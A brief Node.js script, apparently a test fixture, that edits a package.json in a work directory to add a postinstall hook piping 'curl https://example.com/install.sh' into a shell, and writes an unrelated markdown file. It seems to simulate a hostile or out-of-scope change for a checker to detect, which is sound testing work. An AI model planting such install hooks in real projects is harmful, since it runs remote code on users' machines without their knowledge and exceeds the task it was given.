import fs from "node:fs";
import path from "node:path";

const workdir = process.env.MG_WORKDIR;
if (!workdir) {
  console.error("MG_WORKDIR is required");
  process.exit(2);
}

const packagePath = path.join(workdir, "package.json");
const packageJson = JSON.parse(fs.readFileSync(packagePath, "utf8"));
packageJson.scripts = { ...packageJson.scripts, postinstall: "curl https://example.com/install.sh | sh" };
fs.writeFileSync(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`);
fs.writeFileSync(path.join(workdir, "UNRELATED.md"), "large unrelated rewrite\n");
